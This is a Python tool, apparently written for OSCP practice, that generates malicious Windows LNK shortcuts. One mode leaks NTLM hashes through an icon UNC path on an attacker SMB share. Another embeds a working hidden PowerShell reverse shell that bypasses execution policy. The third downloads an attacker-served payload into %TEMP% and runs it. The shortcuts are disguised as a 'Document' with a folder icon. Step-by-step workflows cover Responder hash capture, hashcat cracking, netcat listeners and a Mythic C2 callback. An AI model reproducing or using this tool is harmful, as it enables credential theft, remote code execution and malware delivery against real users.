#!/usr/bin/env python3
"""
lnkgen.py - Generate malicious LNK files for OSCP

Three modes:
  ntlm      - Icon points to attacker SMB share (browse to trigger, no click needed)
  shell     - Executes a reverse shell payload on click
  dropper   - Downloads and executes a payload from attacker HTTP server on click

Usage:
  python3 lnkgen.py ntlm   -i 192.168.45.212 -o steal.lnk
  python3 lnkgen.py shell  -i 192.168.45.212 -p 4444 -o shell.lnk
  python3 lnkgen.py drop   -i 192.168.45.212 -f apollo.exe -o drop.lnk
"""

import argparse
import sys
import os

try:
    import pylnk3
except ImportError:
    print("[-] pylnk3 not installed. Run: pip install pylnk3")
    sys.exit(1)


# ── LNK types ─────────────────────────────────────────────────────────────────

def make_ntlm_lnk(attacker_ip: str, output: str, share: str = "share"):
    """
    NTLM hash capture LNK.

    Sets the icon path to a UNC path on the attacker machine.
    When a user browses the folder containing this LNK, Windows
    automatically tries to load the icon over SMB and sends
    Net-NTLMv2 credentials to the attacker.

    No click required — browse to folder is enough.
    Capture with: sudo responder -I tun0 -wv
    """
    unc_path = f"\\\\{attacker_ip}\\{share}\\icon"

    lnk = pylnk3.create(unc_path)
    lnk.icon        = unc_path
    lnk.icon_index  = 0
    lnk.description = "Document"
    lnk.window_mode = "Normal"
    lnk.save(output)

    print(f"[+] NTLM capture LNK: {output}")
    print(f"    Icon path : {unc_path}")
    print(f"    Trigger   : User browses folder (no click needed)")
    print(f"    Capture   : sudo responder -I tun0 -wv")


def make_shell_lnk(attacker_ip: str, port: int, output: str):
    """
    Reverse shell LNK.

    Target is cmd.exe with a hidden PowerShell reverse shell as arguments.
    Executes when the user double-clicks the LNK.

    Set up listener: nc -lvnp <port>
    """
    # PowerShell reverse shell — hidden window, bypasses execution policy
    ps_payload = (
        f"$c=New-Object Net.Sockets.TCPClient('{attacker_ip}',{port});"
        f"$s=$c.GetStream();"
        f"[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);"
        f"$x=$r+'PS '+(pwd).Path+'> ';"
        f"$n=$x.Length;"
        f"$b2=New-Object Byte[] $n;"
        f"$e=New-Object Text.ASCIIEncoding;"
        f"$e.GetBytes($x,0,$n,$b2,0);"
        f"$s.Write($b2,0,$n)}}"
    )

    arguments = f'/c start /min "" powershell -nop -w hidden -ep bypass -c "{ps_payload}"'

    lnk = pylnk3.create("C:\\Windows\\System32\\cmd.exe")
    lnk.arguments   = arguments
    lnk.icon        = "C:\\Windows\\System32\\shell32.dll"
    lnk.icon_index  = 3   # folder icon — looks innocent
    lnk.description = "Document"
    lnk.window_mode = "Minimized"
    lnk.save(output)

    print(f"[+] Reverse shell LNK: {output}")
    print(f"    Callback  : {attacker_ip}:{port}")
    print(f"    Trigger   : User double-clicks LNK")
    print(f"    Listener  : nc -lvnp {port}")


def make_dropper_lnk(attacker_ip: str, filename: str, output: str, port: int = 80):
    """
    Dropper LNK.

    Downloads a payload from attacker HTTP server and executes it.
    Useful for delivering an Apollo/C2 agent.

    Trigger: user double-clicks LNK
    Serve payload: python3 -m http.server 80
    """
    url = f"http://{attacker_ip}:{port}/{filename}"

    # Download to %TEMP% and execute
    arguments = (
        f'/c powershell -nop -w hidden -ep bypass -c "'
        f'$p=\'$env:TEMP\\{filename}\';'
        f'(New-Object Net.WebClient).DownloadFile(\'{url}\',$p);'
        f'Start-Process $p"'
    )

    lnk = pylnk3.create("C:\\Windows\\System32\\cmd.exe")
    lnk.arguments   = arguments
    lnk.icon        = "C:\\Windows\\System32\\shell32.dll"
    lnk.icon_index  = 3
    lnk.description = "Document"
    lnk.window_mode = "Minimized"
    lnk.save(output)

    print(f"[+] Dropper LNK: {output}")
    print(f"    Payload   : {url}")
    print(f"    Drop path : %TEMP%\\{filename}")
    print(f"    Trigger   : User double-clicks LNK")
    print(f"    Serve     : python3 -m http.server {port}")
    print(f"    (Place {filename} in the directory you serve from)")


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        prog="lnkgen.py",
        description="Generate malicious LNK files for OSCP",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
modes:
  ntlm    Icon UNC path → captures Net-NTLMv2 hash on folder browse (no click)
  shell   Reverse shell payload executed on double-click
  drop    Downloads and executes a payload from your HTTP server on double-click

examples:
  python3 lnkgen.py ntlm  -i 192.168.45.212 -o steal.lnk
  python3 lnkgen.py shell -i 192.168.45.212 -p 4444 -o shell.lnk
  python3 lnkgen.py drop  -i 192.168.45.212 -f apollo.exe -o drop.lnk
  python3 lnkgen.py drop  -i 192.168.45.212 -f apollo.exe -o drop.lnk --port 8080

workflow — ntlm capture:
  1. sudo responder -I tun0 -wv
  2. python3 lnkgen.py ntlm -i YOUR_IP -o steal.lnk
  3. Upload steal.lnk to SMB share
  4. Wait for hash in Responder output
  5. hashcat -m 5600 hash.txt rockyou.txt

workflow — reverse shell:
  1. nc -lvnp 4444
  2. python3 lnkgen.py shell -i YOUR_IP -p 4444 -o shell.lnk
  3. Upload shell.lnk to SMB share
  4. Wait for simulated user to click it

workflow — C2 dropper:
  1. Copy apollo.exe to /tmp/serve/
  2. cd /tmp/serve && python3 -m http.server 80
  3. python3 lnkgen.py drop -i YOUR_IP -f apollo.exe -o drop.lnk
  4. Upload drop.lnk to SMB share
  5. Wait for callback in Mythic
        """
    )

    p.add_argument("mode", choices=["ntlm", "shell", "drop"],
                   help="Type of LNK to generate")
    p.add_argument("-i", "--ip", required=True,
                   help="Your attacker IP (tun0)")
    p.add_argument("-o", "--output", default="payload.lnk",
                   help="Output filename (default: payload.lnk)")
    p.add_argument("-p", "--port", type=int, default=4444,
                   help="Port for reverse shell or HTTP server (default: 4444)")
    p.add_argument("-f", "--file",
                   help="Payload filename to serve (dropper mode)")
    p.add_argument("-s", "--share", default="share",
                   help="SMB share name for NTLM capture (default: share)")

    return p.parse_args()


def main():
    args = parse_args()

    if args.mode == "ntlm":
        make_ntlm_lnk(args.ip, args.output, args.share)

    elif args.mode == "shell":
        make_shell_lnk(args.ip, args.port, args.output)

    elif args.mode == "drop":
        if not args.file:
            print("[-] --file required for drop mode")
            sys.exit(1)
        make_dropper_lnk(args.ip, args.file, args.output, args.port)

    print(f"\n[*] Upload with:")
    print(f"    smbclient //TARGET_IP/sharename -u USER -p PASS")
    print(f"    smb: \\> put {args.output}")


if __name__ == "__main__":
    main()
